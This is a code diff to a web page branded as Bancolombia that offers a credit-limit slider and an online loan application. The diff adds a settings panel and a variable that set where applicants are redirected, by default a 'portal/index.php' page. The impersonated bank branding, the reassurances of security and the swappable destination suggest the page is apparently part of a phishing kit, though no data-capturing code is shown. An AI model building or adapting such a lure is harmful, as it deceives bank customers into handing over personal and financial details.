@@ -125,18 +125,6 @@
     }
 
     /* Banner/hero (con ajuste sin recorte) */
-    /* .hero{
-      margin-top: 12px;
-      border-radius: 22px;
-      border: 1px solid rgba(15,15,16,.08);
-      background:
-        radial-gradient(700px 240px at 18% 20%, rgba(253,226,60,.20), transparent 55%),
-        radial-gradient(700px 260px at 92% 50%, rgba(24,206,225,.15), transparent 60%),
-        linear-gradient(135deg, rgba(255,255,255,.96), rgba(255,255,255,.55));
-      box-shadow: var(--shadow2);
-      overflow:hidden;
-      padding: 12px;
-    } */
     .heroCard{
       margin-top: 12px;
       border-radius: 18px;
@@ -148,11 +136,7 @@
       width:100%;
       height:auto;
       min-height: 150px;
-      background:
-        /* radial-gradient(520px 220px at 22% 30%, rgba(253,226,60,.16), transparent 55%),
-        radial-gradient(520px 220px at 82% 60%, rgba(185,112,213,.12), transparent 60%),
-        linear-gradient(135deg, rgba(24,206,225,.09), rgba(255,255,255,.78)), */
-        url(portal/img/backb.png);
+      background: url(portal/img/backb.png);
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
@@ -161,10 +145,10 @@
     }
     .heroImage img{
       width:100%;
-      height:auto;            /* ✅ se ajusta */
+      height:auto;
       display:block;
-      object-fit: contain;    /* ✅ no recorta */
-      max-height: 320px;      /* evita que sea gigante */
+      object-fit: contain;
+      max-height: 320px;
       filter: saturate(1.06) contrast(1.02);
     }
     .heroPH{
@@ -402,6 +386,67 @@
       body{ padding: 26px 14px 36px; }
       h1{ font-size: 22px; }
     }
+    
+    /* Estilos para el configurador */
+    .config-panel {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      border: 1px solid var(--border);
+      z-index: 1000;
+      max-width: 300px;
+    }
+    
+    .config-toggle {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: var(--primary);
+      color: var(--primaryText);
+      border: none;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      cursor: pointer;
+      font-weight: bold;
+      z-index: 1001;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    
+    .config-hidden {
+      display: none;
+    }
+    
+    .config-input {
+      width: 100%;
+      padding: 8px;
+      margin: 8px 0;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    
+    .config-label {
+      font-size: 12px;
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+    }
+    
+    .config-btn {
+      background: var(--andino);
+      color: white;
+      border: none;
+      padding: 8px 15px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 100%;
+    }
   </style>
 </head>
 
@@ -429,14 +474,17 @@
                 <span>ESPACIO PARA BANNER</span>
               </div>
             </div>
-
-
+            <div class="heroMeta">
+              <div class="pill"><i></i>Rápido</div>
+              <p class="mini">Sin papeles, solicitud 100% digital y segura</p>
+            </div>
+          </div>
+        </div>
       </header>
 
       <main>
         <div class="formCard">
           <div class="formHead">
-
             Solicitud
           </div>
 
@@ -476,24 +524,55 @@
           <img id="footerbancol" src="portal/img/logo.svg" alt="Logo Entidad" >
           <img id="footer-logo" src="portal/img/brand-vigilado.svg" alt="Vigilado " width="25px" aling-item="center">
         </div>
-        <!-- <div class="trust" aria-label="Confianza">
-
-          <span class="seal"><span class="ico"></span>Datos protegidos</span>
-          <span class="seal alt"><span class="ico"></span>Validación</span>
-        </div> -->
-<!-- 
-        <div>Dirección IP: <span id="ip">—</span></div> -->
-        <div>© Bancolombia <span id="year"></span></div>
+        
+        <div>©️ Bancolombia <span id="year"></span></div>
       </footer>
     </section>
   </div>
 
-  <script>
-    const formatCOP = (n) => `$ ${Number(n).toLocaleString('es-CO')}`;
+  <!-- Panel de configuración (solo para desarrollo/administración) -->
+  <button id="configToggle" class="config-toggle">⚙️</button>
+  
+  <div id="configPanel" class="config-panel config-hidden">
+    <h3 style="margin-top: 0;">Configurar Redirección</h3>
+    
+    <label class="config-label">URL de destino:</label>
+    <input type="text" id="configUrl" class="config-input" 
+           placeholder="https://ejemplo.com/formulario" 
+           value="portal/index.php">
+    
+    <label class="config-label">Mensaje de carga:</label>
+    <select id="configLoading" class="config-input">
+      <option value="true">Activado</option>
+      <option value="false">Desactivado</option>
+    </select>
+    
+    <button id="configSave" class="config-btn">Guardar Configuración</button>
+    <button id="configTest" class="config-btn" style="background: var(--caribe);">Probar Redirección</button>
+    
+    <div style="margin-top: 10px; font-size: 11px; color: var(--muted);">
+      <strong>URL actual:</strong> 
+      <span id="currentUrlDisplay" style="word-break: break-all;"></span>
+    </div>
+  </div>
 
+  <script>
+    // ============================================
+    // CONFIGURACIÓN PRINCIPAL
+    // ⚡ CAMBIA ESTA VARIABLE PARA MODIFICAR LA URL ⚡
+    // ============================================
+    let URL_REDIRECCION = "portal/index.php";
+    // ============================================
+    
+    // Función para formatear números en pesos colombianos
+    const formatCOP = (n) => `$ ${Number(n).toLocaleString('es-CO')}`;
+    
+    // Elementos del DOM
     const range = document.getElementById('cupoRange');
     const out = document.getElementById('cupoInput');
-
+    const btnSolicitar = document.getElementById('btnSolicitar');
+    
+    // Actualizar la barra de rango visualmente
     const paintTrack = () => {
       const min = Number(range.min);
       const max = Number(range.max);
@@ -502,23 +581,100 @@
       range.style.background =
         `linear-gradient(90deg, var(--primary) ${pct}%, rgba(15,15,16,.10) ${pct}%)`;
     };
-
+    
+    // Sincronizar el input con el rango
     const sync = () => {
       out.value = formatCOP(range.value);
       paintTrack();
     };
-
-    range.addEventListener('input', sync);
-    sync();
-
-    document.getElementById('year').textContent = new Date().getFullYear();
-
-    document.getElementById('btnSolicitar').addEventListener('click', () => {
+    
+    // Función principal de redirección
+    const redirigir = () => {
+      // Guardar el cupo seleccionado en localStorage
       const cupo = Number(range.value);
       localStorage.setItem('cupo_seleccionado', cupo);
-      window.location.href = "portal/index.php";
+      
+      // Mostrar mensaje de carga en el botón
+      const textoOriginal = btnSolicitar.textContent;
+      btnSolicitar.textContent = 'Redirigiendo...';
+      btnSolicitar.disabled = true;
+      
+      // Redirigir después de un breve delay
+      setTimeout(() => {
+        console.log('Redirigiendo a:', URL_REDIRECCION);
+        window.location.href = URL_REDIRECCION;
+      }, 800);
+      
+      // Restaurar el botón después de 3 segundos (por si hay error)
+      setTimeout(() => {
+        btnSolicitar.textContent = textoOriginal;
+        btnSolicitar.disabled = false;
+      }, 3000);
+    };
+    
+    // Inicialización
+    range.addEventListener('input', sync);
+    btnSolicitar.addEventListener('click', redirigir);
+    sync();
+    document.getElementById('year').textContent = new Date().getFullYear();
+    
+    // ============================================
+    // PANEL DE CONFIGURACIÓN (solo para desarrollo)
+    // ============================================
+    const configToggle = document.getElementById('configToggle');
+    const configPanel = document.getElementById('configPanel');
+    const configUrl = document.getElementById('configUrl');
+    const configSave = document.getElementById('configSave');
+    const configTest = document.getElementById('configTest');
+    const currentUrlDisplay = document.getElementById('currentUrlDisplay');
+    
+    // Mostrar/ocultar panel de configuración
+    configToggle.addEventListener('click', () => {
+      configPanel.classList.toggle('config-hidden');
+      if (!configPanel.classList.contains('config-hidden')) {
+        configUrl.value = URL_REDIRECCION;
+        currentUrlDisplay.textContent = URL_REDIRECCION;
+      }
     });
-
+    
+    // Guardar configuración
+    configSave.addEventListener('click', () => {
+      const nuevaUrl = configUrl.value.trim();
+      if (nuevaUrl) {
+        URL_REDIRECCION = nuevaUrl;
+        currentUrlDisplay.textContent = nuevaUrl;
+        alert('URL de redirección actualizada a:\n' + nuevaUrl);
+        console.log('URL actualizada:', URL_REDIRECCION);
+        
+        // Guardar en localStorage para persistencia
+        localStorage.setItem('url_redireccion', nuevaUrl);
+      } else {
+        alert('Por favor, ingresa una URL válida');
+      }
+    });
+    
+    // Probar redirección
+    configTest.addEventListener('click', () => {
+      const testUrl = configUrl.value.trim() || URL_REDIRECCION;
+      if (confirm(`¿Redirigir a:\n${testUrl}\n\n(Solo es una prueba, no se guardará el cupo)`)) {
+        window.open(testUrl, '_blank');
+      }
+    });
+    
+    // Cargar URL guardada en localStorage al iniciar
+    const urlGuardada = localStorage.getItem('url_redireccion');
+    if (urlGuardada) {
+      URL_REDIRECCION = urlGuardada;
+    }
+    
+    // Mostrar URL actual en consola
+    console.log('=== Configuración de Redirección ===');
+    console.log('URL destino:', URL_REDIRECCION);
+    console.log('Para cambiar la URL:');
+    console.log('1. Busca la variable "URL_REDIRECCION" en el código');
+    console.log('2. Cambia el valor entre las comillas');
+    console.log('3. O usa el panel de configuración (botón ⚙️)');
+    console.log('====================================');
   </script>
 </body>
 </html>
